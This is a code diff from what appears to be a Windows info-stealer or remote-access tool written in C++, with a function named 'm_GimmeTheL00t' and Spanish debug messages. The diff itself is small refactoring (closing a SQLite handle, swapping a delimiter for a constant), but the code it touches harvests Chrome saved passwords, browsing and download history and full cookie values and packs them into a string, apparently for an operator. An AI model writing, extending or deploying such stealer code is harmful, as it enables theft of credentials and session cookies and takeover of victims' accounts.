@@ -114,6 +114,7 @@ std::vector<std::vector<std::string>> mod_Info::m_GimmeTheL00t(const char* cQuer
 				}
 			}
 			sqlite3_finalize(pStmt);
+			sqlite3_close(db);
 		}
 	} else {
 		_DBG_("No se pudo copiar la bd del usuario ", GetLastError());
@@ -471,11 +472,11 @@ std::string mod_Info::m_GetProfileData(const std::string& strPath, const char cO
 			//Passwords
 			for (Chrome_Login_Data& login_data : this->m_ProfilePasswords(strPath)) {
 				strOut += login_data.strUrl;
-				strOut += ":[<->]:";
+				strOut += CMD_DEL_2;
 				strOut += login_data.strAction;
-				strOut += ":[<->]:";
+				strOut += CMD_DEL_2;
 				strOut += login_data.strUser;
-				strOut += ":[<->]:";
+				strOut += CMD_DEL_2;
 				strOut += login_data.strPassword;
 				strOut += ":[<>]:";
 			}
@@ -484,11 +485,11 @@ std::string mod_Info::m_GetProfileData(const std::string& strPath, const char cO
 			//historial navegacion
 			for (Chrome_History& history_data : this->m_ProfileBrowsingHistory(strPath)) {
 				strOut += history_data.strURL;
-				strOut += ":[<->]:";
+				strOut += CMD_DEL_2;
 				strOut += history_data.strTitle;
-				strOut += ":[<->]:";
+				strOut += CMD_DEL_2;
 				strOut += history_data.strVisitCount;
-				strOut += ":[<->]:";
+				strOut += CMD_DEL_2;
 				strOut += history_data.strLastVisitTime;
 				strOut += ":[<>]:";
 			}
@@ -497,13 +498,13 @@ std::string mod_Info::m_GetProfileData(const std::string& strPath, const char cO
 			//Historial descargas
 			for (Chrome_Download_History& history_down_data : this->m_ProfileDownloadHistory(strPath)) {
 				strOut += history_down_data.strTargetPath;
-				strOut += ":[<->]:";
+				strOut += CMD_DEL_2;
 				strOut += history_down_data.strStartTime;
-				strOut += ":[<->]:";
+				strOut += CMD_DEL_2;
 				strOut += history_down_data.strTotalBytes;
-				strOut += ":[<->]:";
+				strOut += CMD_DEL_2;
 				strOut += history_down_data.strTabURL;
-				strOut += ":[<->]:";
+				strOut += CMD_DEL_2;
 				strOut += history_down_data.strMimeType;
 				strOut += ":[<>]:";
 			}
@@ -519,19 +520,19 @@ std::string mod_Info::m_GetProfileData(const std::string& strPath, const char cO
 			//Cookies
 			for (Cookie& cookie_data : this->m_ProfileCookies(strPath)) {
 				strOut += cookie_data.strCreationUTC;
-				strOut += ":[<->]:";
+				strOut += CMD_DEL_2;
 				strOut += cookie_data.strHostKey;
-				strOut += ":[<->]:";
+				strOut += CMD_DEL_2;
 				strOut += cookie_data.strName;
-				strOut += ":[<->]:";
+				strOut += CMD_DEL_2;
 				strOut += cookie_data.strValue;
-				strOut += ":[<->]:";
+				strOut += CMD_DEL_2;
 				strOut += cookie_data.strPath;
-				strOut += ":[<->]:";
+				strOut += CMD_DEL_2;
 				strOut += cookie_data.strExpiresUTC;
-				strOut += ":[<->]:";
+				strOut += CMD_DEL_2;
 				strOut += cookie_data.strLastAccessUTC;
-				strOut += ":[<->]:";
+				strOut += CMD_DEL_2;
 				strOut += cookie_data.strLastUpdateUTC;
 				strOut += ":[<>]:";
 			}
